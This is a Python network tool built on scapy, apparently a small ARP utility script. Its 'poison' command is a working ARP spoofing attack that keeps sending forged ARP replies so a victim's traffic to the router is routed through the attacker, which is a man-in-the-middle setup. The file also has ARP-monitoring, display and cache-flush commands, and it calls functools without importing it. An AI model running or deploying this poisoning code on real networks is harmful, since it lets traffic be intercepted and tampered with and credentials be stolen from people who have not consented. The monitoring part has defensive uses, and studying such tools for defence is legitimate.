#!/usr/bin/env python


import sh
import re
import argh
import time
import signal
import logging
import itertools
from scapy.all import *

import utils


def _arp_registered_MAC(ip, interface=Ether):
    return srp(ARP(pdst=ip), timeout=5, retry=3)[0][1][interface].src


def _load_mac_table():
    pattern = re.compile(r' \((\d+\.\d+\.\d+.\d+)\) at ([0-9a-f:]{17}) \[[\w]+\] on (\w+)')

    results = {}
    for line in sh.arp('-a'):
        match = pattern.search(line)
        if not match:
            continue

        ip, mac, interface = match.group(1), match.group(2), match.group(3)
        if interface not in results:
            results[interface] = list()
        results[interface].append((ip, mac))

    return results


def poison(routerIP, victimIP, attackerIP, interface='eth0'):
    routerMAC = _arp_registered_MAC(routerIP)
    victimMAC = _arp_registered_MAC(victimIP)
    attackerMAC = _arp_registered_MAC(attackerIP)
    if not routerMAC or not victimMAC or not attackerMAC:
        logging.error('''Could not determine all parties MACs:\n
                      \t router   IP: {rip} \t MAC: {rmac} \n
                      \t victim   IP: {vip} \t MAC: {vmac} \n
                      \t attacker IP: {aip} \t MAC: {amac} \n
                      '''.format(rip=routerIP, rmac=routerMAC,
                                 vip=victimIP, vmac=victimMAC,
                                 aip=attackerIP, amac=attackerMAC))
        return

    def _signal_handler(signal, frame):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))

    with utils.ip_forwarding():
        signal.signal(signal.SIGINT, _signal_handler)
        while True:
            send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
            send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=attackerMAC, hwsrc=routerMAC), count=3)
            time.sleep(2)


def monitor(interface=None):
    try:
        table = dict(itertools.chain(*_load_mac_table().values()))
    except:
        table = {}

    def fn(packet):
        if not packet[ARP].op == 2:
            return

        ip, mac = packet[ARP].psrc, packet[ARP].hwsrc
        msg = "Response: \t %s \t has address \t %s" % (ip, mac)

        if table.get(ip):
            if table[ip] != mac:
                logging.warn('%s \t > Differ from current arp table' % msg)
                print '%s > %s' % (ip, mac)
            else:
                logging.info('%s \t > Already on arp table' % msg)
        else:
            logging.info('%s \t > New to arp table' % msg)

        table[ip] = mac

    sniff_fn = sniff if not interface else functools.partial(sniff, iface=interface)
    sniff_fn(filter='arp', prn=fn, store=0)


def display(interface=None):
    for iface, entries in _load_mac_table().items():
        if interface and iface != interface:
            continue

        print 'Interface %s (%i items)' % (iface, len(entries))
        for ip, mac in sorted(entries):
            print '\t %s \t %s' % (ip, mac)
        print


def flush(ip=None, interface=None):
    if not ip:
        table = _load_mac_table()
        entries = table.get(interface, []) if interface else itertools.chain(*table.values())
    else:
        entries = [(ip, None)]

    for ip, _ in entries:
        sh.arp('-d', ip)
        logging.info('Flushed %s' % ip)


if __name__ == '__main__':
    utils.assure_root()
    utils.config_graceful_exit()
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    argh.dispatch_commands([poison, flush, monitor, display])
